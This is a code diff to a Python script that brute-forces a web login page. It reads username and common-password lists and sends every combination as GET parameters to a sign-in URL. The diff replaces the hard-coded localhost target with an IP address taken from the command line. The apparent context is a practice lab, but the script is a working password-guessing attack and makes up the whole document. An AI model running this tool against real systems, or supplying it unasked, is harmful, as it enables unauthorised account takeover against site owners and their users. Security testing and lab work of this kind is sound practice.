@@ -1,7 +1,16 @@
 import requests
+import sys
+
+# Check if the IP address was provided as a command line argument
+if len(sys.argv) != 2:
+    print("Usage: python3 script.py <ip_address>")
+    exit()
+
+# Get the IP address from the command line arguments
+ip_address = sys.argv[1]
 
 # Base URL of the login page
-base_url = "http://127.0.0.1:8080/?page=signin&username={}&password={}&Login=Login#"
+base_url = "http://{}/?page=signin&username={}&password={}&Login=Login#"
 
 # Function to read usernames from a text file
 def load_usernames(file_path):
@@ -23,7 +32,7 @@ passwords = load_passwords('common_passwords.txt')
 for username in usernames:
     for password in passwords:
         # Construct the login URL with username and password as parameters
-        login_url = base_url.format(username, password)
+        login_url = base_url.format(ip_address, username, password)
 
         # Send a GET request to the login URL
         response = requests.get(login_url)
